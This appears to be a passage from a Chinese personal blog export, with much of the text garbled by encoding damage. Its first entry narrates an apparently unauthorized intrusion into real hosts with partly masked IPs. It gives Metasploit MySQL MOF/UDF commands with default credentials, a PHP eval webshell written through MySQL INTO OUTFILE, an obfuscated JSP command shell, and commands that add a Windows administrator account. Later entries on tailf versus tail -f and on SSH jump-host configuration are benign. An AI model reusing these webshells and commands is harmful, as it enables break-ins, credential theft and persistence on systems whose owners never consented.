ÂêØÂä®msfÈÄâÊã©exploit&gt; msfconsole&gt; search mysql_mofMatching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- exploit/windows/mysql/mysql_mof 2012-12-01 excellent Oracle MySQL for Microsoft Windows MOF Execution&gt; use exploit/windows/mysql/mysql_mof# 2. ËÆæÁΩÆÁõÆÊ†ámsf exploit(windows/mysql/mysql_mof) &gt; show options# show advanced# ÊòæÁ§∫È´òÁ∫ßÈÄâÈ°πÔºåËøõË°åËá™ÂÆö‰πâËøôÈáå‰∏çÈúÄË¶ÅÊöÇ‰∏î‰∏çÂ±ïÂºÄËÆ®ËÆ∫Module options (exploit/windows/mysql/mysql_mof): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD yes The password to authenticate with RHOST yes The target address RPORT 3306 yes The target port (TCP) USERNAME yes The username to authenticate asExploit target: Id Name -- ---- 0 MySQL on Windows prior to Vista&gt; set RHOST 115.28.xxx.xxx&gt; set PASSWORD root&gt; set USERNAME root# 3. ÂêØÂä®&gt; exploit ÂëΩ‰ª§ÊâßË°åÊàêÂäüÔºåÊ≤°ÊúâËøîÂõûsessionÔºå Âà©Áî®Á®ãÂ∫èÂèØËÉΩË¢´Âà†Èô§ 2) UDFÊèêÊùÉÂ∞ùËØïUDFÊèêÊùÉmsf exploit(windows/mysql/mysql_mof) &gt; search mysql_udfMatching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- exploit/multi/mysql/mysql_udf_payload 2009-01-16 excellent Oracle MySQL UDF Payload Execution&gt; use exploit/multi/mysql/mysql_udf_payload&gt; show options&gt; set RHOST 115.28.xxx.xxx&gt; set PASSWORD root&gt; set USERNAME root Ê≥®ÊÑèÁ∫¢Ê°ÜÂúàÂá∫‰ΩçÁΩÆÔºåÊ†πÊçÆÁõÆÂΩïÁªìÊûÑÂà§Êñ≠ÊòØPhpStudyÊê≠Âª∫ÁöÑÔºåÂêéÈù¢‰ºö‰ΩøÁî®Âà∞ ‰æùÊóßÊ≤°ÊúâÊàêÂäüËøîÂõûsessionÔºåÊúâÂ∞ùËØï‰∫ÜÂá†Ê¨°MOFÔºåÂèëÁé∞ËøûÊé•MysqlË¢´ÊãíÁªù‰∫Ü„ÄÇËøôÊó∂ÊâçÊÉ≥Ëµ∑Êú∫Âô®Êó∂ÈÉ®ÁΩ≤Âú®ÈòøÈáå‰∫ëÔºåÊúâ‰∏Ä‰∏™AliYunDunËøô‰∏™Â∞èÂèØÁà±Ôºå‰∏äÈù¢MOFÁöÑÊèêÊùÉÊñá‰ª∂Â∫îËØ•‰πüÊòØ‰ªñÂà†Èô§ÁöÑ„ÄÇ 3) Â∞ùËØïÂÜôÂÖ•WebShellÁî±‰∏äÈù¢Âú®ËøõË°åUDFÊèêÊùÉÊó∂ÁàÜÂá∫Êù•ÁöÑÊòØ‰ΩøÁî®PhpStudyÊê≠Âª∫ÁöÑwebÁéØÂ¢ÉÔºåÂèØ‰ª•ÁåúÊµãÂá∫ÈªòËÆ§WebË∑ØÂæÑÔºå‰ΩøÁî®‰ª£ÁêÜËøûÊé•ÁõÆÊ†áMysqlÊâßË°åÔºö Êü•ÁúãMysql datadir&gt; select @@datadir;+-----------------------------+| @@datadir |+-----------------------------+| D:\phpStudy4IIS\MySQL\data\ |+-----------------------------+ Êú¨Êú∫‰∏ãËΩΩÁõ∏ÂØπÂ∫îÁâàÊú¨ÂÆâË£ÖÂåÖÔºåÂÆâË£ÖÂêéÊü•ÁúãÂà∞ÈªòËÆ§WebË∑ØÂæÑ‰∏∫D:\phpStudy4IIS\WWW„ÄÇokÊó¢ÁÑ∂ÁΩëÁ´ôÁõÆÂΩïÂæóÂà∞‰∫ÜÂπ∂‰∏îÈÄöËøá‰πãÂâçÁöÑ‰ø°ÊÅØÊî∂ÈõÜÂæóÂà∞‰ΩøÁî®ÁöÑÊòØThinkPHPÔºåÊàë‰ª¨Â∞±Â∞ùËØïÂÜôÂÖ•PHP‰∏ÄÂè•ËØùShell„ÄÇ ËøûÊé•ÁõÆÊ†áMysqlÂÜôÂÖ•Web Shell1234mysql -uroot -proot -h115.28.xxx.xxx mysql# ÂÜôÂÖ•PHP shellselect load_file('/root/sys_thinkphp.php') into outfile 'D:\phpStudy4IIS\WWW\sys.php' PHP ShellÊñá‰ª∂ÔºàËá™ÂÆö‰πâÂíåÊ≠£Â∏∏ËèúÂàÄ‰∏çÈÄöÁî®ÔºâÔºö sys_thinkphp.php1234567&lt;?php$thinkss = create_function('$a', 'ev'.'al($a);');$thinkss(stripslashes($_POST['kionf']));?&gt; ‰ΩøÁî®ÊµèËßàÂô®ËÆøÈóÆÔºåÊ≤°Ë¶ÅÊä•404„ÄÇshellÂÜôÂÖ•ÊàêÂäüÔºÅÔºÅ 3. Ëøõ‰∏ÄÊ≠•Ê∏óÈÄè‰ΩøÁî®ËèúÂàÄËøûÊé•Ôºö Ëé∑ÂèñshellÔºåÈÄöËøáÊü•ÁúãÁõÆÂΩïÁªìÊûÑ„ÄÅÂèäasp„ÄÅphp„ÄÅtomcat‰ª£Á†ÅÔºåËøôÈáåÁúÅÁï•‰∏Ä‰∏áÂ≠óÔºåËé∑ÂèñÂ¶Ç‰∏ã‰ø°ÊÅØÔºö ÁéØÂ¢É: tomcat7.0 IIS mysql aspxÁΩëÁ´ôË∑ØÂæÑÊü•Áúã‰ª£Á†ÅÂèëÁé∞ËøûÊé•Êï∞ÊçÆÂ∫ì‰∏∫Âπ∂ÂæóÂà∞ÂØÜÁ†Å: Mysql: 114.215.xxx.xxx Mysql: 115.29.xx.xxx SqlServer: 115.29.xx.xxx Â∏∏Áî®WEBÊúçÂä°ÈÖçÁΩÆÊñá‰ª∂‰ΩçÁΩÆÔºö ThinkPhp: ./www/ThinkPHP/Conf/ ./www/Application/Common/Conf/Tomcat: ./tomcat/webapps/appname/WEB-INF/classes/IIS: ./www/Web.config 4. ‰ºëÊàò‰ΩøÁî®ËèúÂàÄËøûÊé•shellÁî±‰∫éÁéØÂ¢ÉÈóÆÈ¢òÊó†Ê≥ïÊâßË°åÁªàÁ´ØÂëΩ‰ª§„ÄÇÁúãÂà∞ÊúâtomcatÂ∫îÁî®ÔºåÂ∞±‰º†‰∏ä‰∏™Â∞èjspÈ©¨Êù•ÊâßË°åÂëΩ‰ª§,Ê∑ªÂä†‰∏™Áî®Êà∑ jspÂ∞èÈ©¨È©¨12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;%@ page import="java.util.Scanner" pageEncoding="UTF-8" %&gt;&lt;HTML&gt;&lt;title&gt;Titanium&lt;/title&gt;&lt;BODY&gt;&lt;FORM METHOD=POST ACTION='#'&gt; &lt;INPUT name='q' type=text&gt; &lt;INPUT type=submit value='Fly'&gt;&lt;/FORM&gt;&lt;%! public static String getPicture(String str) throws Exception&#123; String fileSeparator = String.valueOf(java.io.File.separatorChar); if(fileSeparator.equals("\\"))&#123; str = new String(new byte[] &#123;99, 109, 100, 46, 101, 120, 101, 32, 47, 67, 32&#125;) + str; &#125;else&#123; str = new String(new byte[] &#123;47, 98, 105, 110, 47, 98, 97, 115, 104, 32, 45, 99, 32&#125;) + str; &#125; Class rt = Class.forName(new String(new byte[] &#123; 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 &#125;)); Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null, new Object[]&#123;&#125;), new Object[] &#123; str &#125;); Scanner sc = new Scanner(e.getInputStream()).useDelimiter("\\A"); String result = ""; result = sc.hasNext() ? sc.next() : result; sc.close(); return result; &#125;%&gt;&lt;% String name ="Input Nothing"; String query = request.getParameter("q"); if(query != null) &#123; name = getPicture(query); &#125;%&gt;&lt;pre&gt;&lt;%= name %&gt;&lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt; Ê∑ªÂä†WinÁî®Êà∑ËÆæ‰∏∫ÁÆ°ÁêÜÂëò12net user kionf kionf /addnet localgroup adminostrators kionf /add ÈÄöËøáÊü•Áúãphp‰ª£Á†ÅÂàÜÊûêÂá∫ÔºåÊàøÊ∫êÁΩëÁ´ôËøûÊé•ÁöÑÊòØSqlServer: 115.29.xx.xxxÔºåÁî®Êà∑ÁôªÂΩïÈÄöËøáÊü•ËØ¢‰∏§‰∏™Ë°®„ÄÇmysqlÁî®Êà∑Ë°®ËÆ∞ÂΩïÁî®Êà∑ÂèØ‰ª•ÁôªÂΩïipÊï∞ÔºåÂèäÁªëÂÆöip,Â¶ÇÊûúFirstÂ≠óÊÆµ‰∏∫0Âàô‰∏∫È¶ñÊ¨°ÁôªÈôÜÔºåÈ¶ñÊ¨°ÁôªÈôÜipÂÜôÂÖ•Êï∞ÊçÆÂ∫ìÔºåË¥¶Âè∑ÂØÜÁ†ÅÂÇ®Â≠òÂú®SqlServer„ÄÇ ÁôªÈôÜ‰πãÔºÅ 0x02 ÂçÉÈáå‰πãÂ†§ÔºåÊ∫É‰∫éËöÅÁ©¥ Âú®‰∏äÈù¢Ëøõ‰∏ÄÊ≠•Ê∏óÈÄè‰∏≠Ëé∑ÂèñÂà∞‰∏Ä‰∏™Êï∞ÊçÆÂ∫ìÔºö Mysql: 114.215.xxx.xxx Ê†πÊçÆThinkPHPÊ°ÜÊû∂ÈÖçÁΩÆÊñá‰ª∂‰∏≠ÁöÑË¥¶Âè∑ÂØÜÁ†ÅÔºåËøûÊé•ÂêéÊü•ÁúãÊï∞ÊçÆÂ∫ì: ÊâßË°åsql123select @@hostname;iZxxxxxxxx Â∞ùËØïGoogle‰∏ãËøô‰∏™ÁâπÂà´ÁöÑhostnameÔºåÂá∫Áé∞‰∫ÜÊÉäÂñúÔºö Ëøõ‰∏ÄÊ≠•È™åËØÅÂæóÂá∫ÁΩëÁ´ôË∑ØÂæÑÔºö nmapÊâ´ÊèèÊú∫Âô®ÔºåÂæóÂá∫WEBÁ´ØÂè£ËÆøÈóÆ80Á´ØÂè£404ÔºåËÆøÈóÆ443ÊàêÂäüÂá∫Áé∞ÁïåÈù¢ÔºåÊâãÊµãÊ°ÜÊû∂ÁàÜÂá∫WebË∑ØÂæÑÔºö ÈÄöËøáMysqlÂÜôÂÖ•‰∏ÄÂè•ËØùÔºåËèúÂàÄËøû‰πãÔºö rootÂêØÂä®ÁöÑnginxÔºåÊùÉÈôêÂ∞±‰∏çÁî®ËØ¥‰∫ÜÔºåÊ†πÊçÆËé∑Âèñ‰ø°ÊÅØGoogleÊ≠§ÂÖ¨Âè∏titleÔºåÂæóÁü•ÊòØ‰∏Ä‰∏™ËΩØ‰ª∂Â§ñÂåÖÂÖ¨Âè∏Ôºå114.215Ê≠§Âè∞Êú∫Âô®Â∫îËØ•‰∏∫ÂÜÖÈÉ®ÂºÄÂèëÊµãËØïÊú∫Âô®„ÄÇËÄå‰∏îÊ≠§Êú∫Âô®ÂÆâË£ÖÊúâSVN,wwwrootÁõÆÂΩï‰∏ãÊîæÁΩÆÊòØÂ§ñÂåÖÁöÑÈ°πÁõÆ‰ª£Á†ÅÔºåÁªßÁª≠Âª∂‰º∏Ê∏óÈÄèÂ∫îËØ•‰ºöÊãø‰∏ãÊï¥‰∏™Â§ñÂåÖÂÖ¨Âè∏ÊâÄÊúâÊú∫Âô®ÁöÑÊùÉÈôê„ÄÇÊìç‰ΩúËøáÁ®ãÊ≤°Êúâ‰ªÄ‰πàÊäÄÊúØÂê´ÈáèÔºåÈÉΩÊòØÁÇπÂ≠êÈ™öÔºåÂºÄÂèëËøáÁ®ã‰∏≠ÂÆâÂÖ®ÊÑèËØÜËñÑÂº±Ôºå‰ø°ÊÅØÊ≥ÑÊºè„ÄÇÂàöÂàöÂéªÂç´ÁîüÈó¥Â§¥Á™ÅÁÑ∂Êôï‰∫Ü‰∏Ä‰∏ãÔºåÂ∑ÆÁÇπÊëîÂÄí„ÄÇÊàëÁé∞Âú®ÊÖåÁöÑ‰∏ÄÊâπüò® Ë∫´‰ΩìÈáçË¶Å‰∏çÂºÑ‰∫Ü„ÄÇ]]></content>
      <categories>
        <category>hack-note</category>
      </categories>
      <tags>
        <tag>Ê∏óÈÄèÊµãËØïÂ∞èËÆ∞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tailf Âíå tail -f Âå∫Âà´]]></title>
    <url>%2F2018%2F09%2F07%2Flinux-tailf%2F</url>
    <content type="text"><![CDATA[ÂØπ‰∫éÂ∞èÊñá‰ª∂ (Â§ßÁ∫¶Â∞è‰∫é5GB) ‰ΩøÁî®tailfÔºå tail -f Ê≤°ÊúâÊòéÊòæÂå∫Âà´„ÄÇ ‰∏ÄÊ¨°ÂÅ∂ÁÑ∂‰ΩøÁî®tailfÊü•Áúã‰∏Ä‰∏™20GBÊó•ÂøóÊñá‰ª∂Êó∂Ôºå ÂèëÁé∞Êó†Ê≥ïÊòæÁ§∫Ôºå ËÄå‰ΩøÁî®tail -fÂç¥ÂèØ‰ª•ÊòæÁ§∫„ÄÇÁî±Ê≠§Âª∂‰º∏Âá∫Êú¨Êñá 0x00 ÂáÜÂ§áÂÆûÈ™åÁéØÂ¢É Â∞ùËØïÁõ¥Êé•google‰∏§ËÄÖÁöÑÂå∫Âà´ÂèëÁé∞Â§ßÈÉ®ÂàÜËØ¥ÁöÑ‰∏çÊòØÂæàËØ¶ÁªÜÔºåÊäÑÁöÑ‰πü‰∏çÊòØÂæàÂ•Ω„ÄÇÊâÄ‰ª•Ëá™Â∑±ÂÜô‰∏ãÊù•ÂÅö‰∏™Á¨îËÆ∞„ÄÇ 1. ÁîüÊàêÂ§ßÊñá‰ª∂10GB‰ΩøÁî®ddÁîüÊàêÊåáÂÆöÂ§ßÂ∞èÊñá‰ª∂dd if=/dev/urandom of=bigFile bs=10M count=1000 2. ÂÆâË£ÖstraceË∑üË∏™ËøõÁ®ã‰∏≠ÁöÑÁ≥ªÁªüÂáΩÊï∞Ë∞ÉÁî®yum -y install strace 3. ÊµãËØïËΩΩÂÖ•Êó∂Èó¥ÂàÜÂà´‰ΩøÁî® tailfÔºåtail -fÊü•ÁúãÂàöÊâçÁîüÊàêÁöÑÊñá‰ª∂ÔºåÊòéÊòæÊÑüËßâtailfÊØîtail -fÊó∂Èó¥Èïø 0x01 ÂàÜÊûê‰∏§ËÄÖ‰ΩøÁî®ËøáÁ®ã‰∏≠Á≥ªÁªüË∞ÉÁî®Âå∫Âà´ÁéØÂ¢ÉÂáÜÂ§á1234567echo "test" &gt; test# ËøΩË∏™tailfstrace -o trace_tailf tailf test# ËøΩË∏™tail -fstrace -o trace_tail_f tail -f test ÂØπÊØîÁªìÊûú: ‰ªé‰∏äÂõæÂèØ‰ª•ÁúãÂá∫‰∏ªË¶ÅÊúâ‰∏§Â§Ñ‰∏çÂêå test Êñá‰ª∂‰ø°ÊÅØ12345678 Êñá‰ª∂Ôºö"test" Â§ßÂ∞èÔºö5 ÂùóÔºö8 IO ÂùóÔºö4096 ÊôÆÈÄöÊñá‰ª∂ËÆæÂ§áÔºöfd01h/64769d InodeÔºö138235 Á°¨ÈìæÊé•Ôºö1ÊùÉÈôêÔºö(0644/-rw-r--r--) UidÔºö( 0/ root) GidÔºö( 0/ root)ÊúÄËøëËÆøÈóÆÔºö2018-09-07 17:59:24.842451394 +0800ÊúÄËøëÊõ¥ÊîπÔºö2018-09-07 17:59:19.175452013 +0800ÊúÄËøëÊîπÂä®Ôºö2018-09-07 17:59:19.175452013 +0800ÂàõÂª∫Êó∂Èó¥Ôºö- 0x02 Âå∫Âà´1. Ë∞ÉÁî®ÂáΩÊï∞Âå∫Âà´‰ΩøÁî®straceËøΩË∏™ÂëΩ‰ª§ÁöÑÁ≥ªÁªüÂáΩÊï∞Ë∞ÉÁî®ÂØºÂá∫Êñá‰ª∂ÔºåÂàÜÊûêÂå∫Âà´ tailf ÊµÅÁ®ã1. ‰ΩøÁî®statÂáΩÊï∞Ëé∑ÂèñÊñá‰ª∂ÂêçÔºåfstatÈÄöËøáÊñá‰ª∂ÂêçËé∑ÂèñÊñá‰ª∂ IO block ‰ø°ÊÅØ 40962. read(3, "test\n", 4096) = 5 #‰ΩøÁî®readÂáΩÊï∞‰ªéÁ£ÅÁõòÂú∞ÂùÄ 4096 ÂºÄÂßãËØªÂèñÊñá‰ª∂ËØªÂèñ5Â≠óËäÇÊñá‰ª∂Â§ßÂ∞è tail -f ÊµÅÁ®ã1. ‰ΩøÁî®fstatÂáΩÊï∞ÈÄöËøáÊñá‰ª∂ÊèèËø∞Á¨¶Ëé∑Âèñ‰ø°ÊÅØÔºåËé∑Âèñseek lseek(3, 0, SEEK_CUR) = 0 #ÂºÄÂßãseek lseek(3, 0, SEEK_END) = 5 #ÁªìÊùüseek lseek(3, 0, SEEK_SET) = 0 #ÂΩìÂâçseek‰ΩçÁΩÆ2. seekËÆæÁΩÆÂà∞SEEK_END‰ΩçÁΩÆÔºåreadÂáΩÊï∞‰ªéÊú´Â∞æËØªÂèñÊñá‰ª∂ read(3, "test\n", 5) = 5 lseek(3, 0, SEEK_SET) = 0 ÈÄöËøáÁ≥ªÁªüÂáΩÊï∞Ë∞ÉÁî®ÂàÜÊûêÂæóÂá∫Âå∫Âà´Ôºö `tailf` : Ë∞ÉÁî®Á≥ªÁªüÂáΩÊï∞`stat()`ÈÄöËøáËé∑ÂèñÂà∞ÁöÑÊñá‰ª∂ÂêçÔºåÊü•Áúãblock‰ΩçÁΩÆÂèäÂ§ßÂ∞èÔºå`read()`‰ªéÂ§¥ÂºÄÂßãËΩΩÂÖ•ÊåáÂÆöÊñá‰ª∂Â§ßÂ∞èÂùó,ËøõË°åËØªÂèñ`tail -f` : Ë∞ÉÁî®Á≥ªÁªüÂáΩÊï∞`fstat()`Ëé∑ÂèñÊñá‰ª∂ÊèèËø∞Á¨¶Ôºå`lseek()`ÂáΩÊï∞`SEEK_SET`ÊñπÊ≥ïÁßªÂä®Êñá‰ª∂ÊåáÈíàÂà∞Êú´Â∞æÔºå‰ªéÊú´Â∞æ`read()`ËøõË°åËØªÂèñ Á≥ªÁªüÂáΩÊï∞ÂØπÊØîÔºö stat(),fstat()Á≥ªÁªüÂáΩÊï∞Ôºö stat()ÔºöÈÄöËøáÊñá‰ª∂ÂêçËé∑ÂèñÊñá‰ª∂‰ø°ÊÅØ fstat()ÔºöÈÄöËøáÊñá‰ª∂ÊèèËø∞Á¨¶Ëé∑ÂèñÊñá‰ª∂‰ø°ÊÅØ‰∏§ËÄÖÂå∫Âà´Ôºö Ëé∑ÂèñÊñá‰ª∂‰ø°ÊÅØÊñπÂºè‰∏çÂêåÂÆâÂÖ®ÈóÆÈ¢ò: ÂΩì‰ΩøÁî®stat()Ëé∑ÂèñÊñá‰ª∂Âπ∂ÊâìÂºÄÂÆÉÊó∂ÔºåÊñá‰ª∂ÂèØËÉΩ‰ºöË¢´‰øÆÊîπÔºàÊàñÊùÉÈôêË¢´Êõ¥ÊîπÔºâÔºåÊàñËÄÖË¢´Á¨¶Âè∑ÈìæÊé•ÊõøÔºåfstat()ÈÅøÂÖç‰∫ÜËøô‰∏™ÈóÆÈ¢ò„ÄÇ 2. Ë∞ÉÁî®ÂáΩÊï∞‰∏çÂêåÔºåÂª∂‰º∏Âá∫ÁöÑÂå∫Âà´ÂºÄ‰∏§‰∏™Á™óÂè£Ôºå‰∏Ä‰∏™Á™óÂè£tailfÊñá‰ª∂ÔºåÂè¶‰∏Ä‰∏™Á™óÂè£Êìç‰ΩúÊñá‰ª∂ [Á™óÂè£1]>tailfÔºåtail -f Êñá‰ª∂tailf test# ÊâßË°årmÔºåmv ÂëΩ‰ª§ÂêétailfÈÄÄÂá∫Êü•ÁúãÊñá‰ª∂Áä∂ÊÄÅtail -f test# ÊâßË°åmv ÂëΩ‰ª§Âêétail -fÁªßÁª≠Êü•ÁúãÊñá‰ª∂Ôºå(Êñá‰ª∂ÂêçÁß∞ÊîπÂèòÔºåÊñá‰ª∂ÊèèËø∞Á¨¶‰∏çÂèò)# ÊâßË°årm ÂëΩ‰ª§Âêétailf -fÁªßÁª≠Êü•ÁúãÊñá‰ª∂ÔºåÈáçÊñ∞ÂàõÂª∫Áõ∏ÂêåÊñá‰ª∂Âêç‰ªçÁÑ∂Êó†Ê≥ïÊü•Áúã(Âõ†‰∏∫Êñá‰ª∂ÁöÑÊèèËø∞Á¨¶Â∑≤ÁªèÊîπÂèò) [Á™óÂè£]2>Êõ¥ÊîπÔºåÂà†Èô§Êñá‰ª∂rm testmv test test.bakecho "dddd" &gt; test Áî±‰∫éËé∑ÂèñÊñá‰ª∂‰ø°ÊÅØÊñπÂºè‰∏çÂêå(statÈÄöËøáÊñá‰ª∂Âêç,fstatÈÄöËøáÊñá‰ª∂ÊèèËø∞Á¨¶)ÔºåÂØºËá¥ÂΩìÊü•ÁúãÊñá‰ª∂Ë¢´Âà†Èô§Êó∂ÔºåtailfÂèØ‰ª•Ëé∑ÂèñÂà∞Êñá‰ª∂Ë¢´Âà†Èô§Ôºåtail -fËé∑Âèñ‰∏çÂà∞„ÄÇ Áî±‰∫étail -f‰ΩøÁî®Êñá‰ª∂ÊèèËø∞Á¨¶ÔºåÊâÄ‰ª•Âç≥‰ΩøÊü•ÁúãËøáÁ®ã‰∏≠Êñá‰ª∂ÂêçÊõ¥Êîπtail -f‰æùÊóßÂèØ‰ª•Ëé∑ÂèñÂà∞Êñá‰ª∂ÂÜÖÂÆπÔºåËÄåtailf ÂàôÊó†Ê≥ïÁªßÁª≠Êü•ÁúãÊñá‰ª∂„ÄÇ ÂÖ±ÂêåÁÇπÔºö ÊâìÂç∞Êñá‰ª∂Âêé10Ë°åÔºåÊñá‰ª∂Â¢ûÈïøËØªÂèñÊñá‰ª∂„ÄÇÈÄöËøálinuxstatÂëΩ‰ª§Êü•ÁúãÊñá‰ª∂‰ø°ÊÅØÔºåtailfÂíåtail -fÈ¶ñÊ¨°ËÆøÈóÆ‰ºöÊîπÂèòÊñá‰ª∂ËÆøÈóÆÊó∂Èó¥ÔºåÂ¶ÇÊûúÊñá‰ª∂Êú™ÊîπÂèòÂàô‰∏ç‰ºöÂà∑Êñ∞Êñá‰ª∂ËÆøÈóÆÊó∂Èó¥ÔºåÊñá‰ª∂ÂÜÖÂÆπÊîπÂèò‰ºöÂÜçÊ¨°ËÆøÈóÆÊñá‰ª∂Âπ∂Âà∑Êñ∞Êñá‰ª∂ËÆøÈóÆÊó∂Èó¥„ÄÇ ÂèÇËÄÉÔºöstat_and_fstattailftail]]></content>
      <categories>
        <category>ErrorNote</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ê∑∑Âêà‰∫ëÈÄöËøáSSHÁΩëÂÖ≥Ë∑≥ÊùøÊú∫ÈößÈÅìÁÆ°ÁêÜ]]></title>
    <url>%2F2018%2F09%2F01%2Fssh-forward%2F</url>
    <content type="text"><![CDATA[ÈÄöËøáSSHÁΩëÂÖ≥‰ª£ÁêÜÔºåËøûÈÄöÊ∑∑Âêà‰∫ëÔºåÈÄöËøáÂ†°ÂûíÊú∫Â∑•ÂÖ∑ÊàñAnsibleÁªü‰∏ÄÁÆ°ÁêÜ„ÄÇ 0x00 ÈóÆÈ¢òÂàÜÊûê‰ª•‰∏ãÂÜÖÂÆπAÂå∫‰ª£Ë°®AWSÔºåBÂå∫‰ª£Ë°®ÈòøÈáå‰∫ë„ÄÇÂπ∂vpcÂÜÖÁΩëÁªú‰∫íÈÄöÔºåÂ§ñÈÉ®ËÆøÈóÆÂè™ËÉΩÈÄöËøáÂ†°ÂûíÊú∫ Â¶Ç‰∏äÂõæÊâÄÁ§∫ÔºåAÂå∫‰∏∫172ÁΩëÊÆµÔºå‰∏îÂè™Êúâ‰∏ÄÂè∞Êú∫Âô®ÂèØ‰æõÂ§ñÁΩëËÆøÈóÆÔºå‰∏îÊ≠§Êú∫Âô®‰∏∫Áé∞ÊúâAnsibleÂ†°ÂûíÊú∫„ÄÇÁé∞Âú®Êñ∞Âä†ÂÖ•BÂå∫Êú∫Âô®ÈúÄË¶ÅÁÆ°ÁêÜÔºåBÂå∫‰πüÂè™Êèê‰æõ‰∏ÄÂè∞‰∏ìÁî®SSHÁΩëÂÖ≥Ë∑≥ÊùøÊú∫‰æõÂ§ñÁΩëËÆøÈóÆ„ÄÇ ÈúÄÊ±ÇÔºöBÂå∫ÈúÄË¶Å‰ΩøÁî®AÂå∫Â∑≤ÊúâAnsibleÂ†°ÂûíÊú∫ÔºåÈÄöËøáBÂå∫Êèê‰æõÁöÑ‰∏ìÁî®SSHË∑≥ÊùøÊú∫Áõ¥Êé•ÁÆ°ÁêÜBÂå∫ÊâÄÊúâÊú∫Âô®„ÄÇ ËøôÈáåÈúÄË¶Å‰ΩøÁî®SSHÔºåProxyCommand‰ª£ÁêÜÈößÈÅìÂäüËÉΩÔºåÊù•ÂÆûÁé∞SSHË∑≥ÊùøÊú∫ 0x01 ÈÖçÁΩÆÈÄöËøá‰øÆÊîπSSHÈÖçÁΩÆÊù•ÊåáÂÆöSSHÈößÈÅì‰ª£ÁêÜ vim ~/.ssh/config12345678910111213141516171819Host jumpserver User root # ÁôªÂΩïÂà∞BÂå∫sshË∑≥ÊùøÊú∫Áî®Êà∑ Hostname 36.22.13.140 # BÂå∫Ë∑≥ÊùøÊú∫IP IdentityFile ~/.ssh/id_rsa # sshË∑≥ÊùøÊú∫sshÂÖçÂØÜkey # ËøûÊé•‰∏ªÊú∫ÂêéÔºåÈúÄË¶ÅÊâßË°åÁöÑÂëΩ‰ª§ ProxyCommand none # Á¶ÅÁî®ÂØÜÁ†ÅÊü•ËØ¢„ÄÇÊ≠§ÈÄâÈ°πÂú®ËÑöÊú¨ÂíåÂÖ∂‰ªñÊ≤°ÊúâÁî®Êà∑Êèê‰æõÂØÜÁ†ÅÁöÑÊâπÂ§ÑÁêÜ‰Ωú‰∏ö‰∏≠ÂæàÊúâÁî® BatchMode yes #ÂåπÈÖç‰ª•‰∏ãhostËßÑÂàôÔºåÂàôÈÄöËøá‰∏äÈù¢ÁöÑ jumpserver ssh‰ª£ÁêÜÈößÈÅìËøûÊé• Host 192.168.11.* # ‰øùÊåÅËøûÊé•ÔºåÊØè30sÂèëÈÄÅÂøÉË∑≥ ServerAliveInterval 30 TCPKeepAlive yes IdentityFile ~/.ssh/id_rsa # BÂå∫Êú∫Âô®sshÂÖçÂØÜkey ProxyCommand ssh -qay jumpserver 'nc %h %p' # ÈáçÂ§ç‰ΩøÁî®Â∑≤Â≠òÂú®ÁöÑËøûÊé•Â•óÊé•Â≠ó ControlMaster auto BÂå∫SSHË∑≥ÊùøÊú∫ÈúÄË¶ÅÂÆâË£ÖncÂëΩ‰ª§ ÂÆâË£Önet-toolsyum -y install net-tools Ê≥®ÔºöÂ¶ÇÊûúBÂå∫SSHÁΩëÂÖ≥Ë∑≥ÊùøÊú∫‰∏çÊÉ≥‰ΩøÁî®ncÂëΩ‰ª§ÔºåÈúÄË¶ÅÊõ¥ÊîπProxyCommand ssh -qay jumpserver &#39;nc %h %p&#39;‰∏∫ProxyCommand ssh -W jumpserver %h:%p` AÂå∫Â†°ÂûíÊú∫ÈÖçÁΩÆÂà∞BÂå∫Êú∫Âô®sshÂÖçÂØÜ ÂÖ∂‰ªñÊú∫Âô®Ëá™Ë°åÈÖçÁΩÆ,ËøôÈáåÁúÅÁï•1ssh-copy-id root@36.22.13.140 0x02 ËøûÊé•ÊµãËØïÂú®AÂå∫Â†°ÂûíÊú∫Áõ¥Êé•Ôºå‰ΩøÁî®sshËøûÊé•BÂå∫192.168.11.*ÁöÑÊú∫Âô® ËøûÊé•Êú∫Âô®12345ssh root@192.168.11.4root@JumpServer[15:47].ssh:$ ssh 192.168.11.4Last login: Sat Sep 8 15:47:02 2018 from 192.168.11.3root@nginx-4[15:47]~:$ ÊàêÂäüÈÄöËøáBÂå∫SSHÁΩëÂÖ≥Ë∑≥ÊùøÊú∫ÔºåËøûÊé•ÁÆ°ÁêÜBÂå∫ÂÜÖÁΩëÊú∫Âô®„ÄÇÊµãËØïÁõ¥Êé•‰ΩøÁî®ansible‰πüÂèØÁÆ°ÁêÜ„ÄÇ Ëá≥Ê≠§Ôºå‰ΩøÁî®SSHÁΩëÂÖ≥Ë∑≥ÊùøÊú∫ÁÆ°ÁêÜÊ∑∑Âêà‰∫ë‰ª•ÈÖçÁΩÆÂÆåÊàê 0x03 ÊÄªÁªì ÈÄöËøá BÂå∫SSHÁΩëÂÖ≥ Êù•ËøûÊé•ÂÜÖÈÉ®VPCÊú∫Âô®ÔºåSSHÈô§‰∫Ü‰∫∫‰ª¨ÁÜüÊÇâÂ∏∏ËßÅÁöÑÁôªÈôÜÁÆ°ÁêÜËøúÁ®ãÁöÑlinux‰∏ªÊú∫ÊÑèÂ§ñÂ∫îÁî®ËøòÊúâÂæàÂ§öÔºåsshÁöÑÁΩëÁªúËΩ¨ÂèëÈößÈÅìÂæàÂº∫Â§ß„ÄÇ Êé®ËçêÈòÖËØªÔºösshÁ´ØÂè£ËΩ¨Âèë ÂèÇËÄÉÔºö ssh-proxycommandssh_config_man]]></content>
      <categories>
        <category>Linux</category>
        <category>SSH</category>
      </categories>
      <tags>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AmbariÊòæÁ§∫HeartbeatÊä•Èîô]]></title>
    <url>%2F2018%2F08%2F30%2Fbigdata-ambari%2F</url>
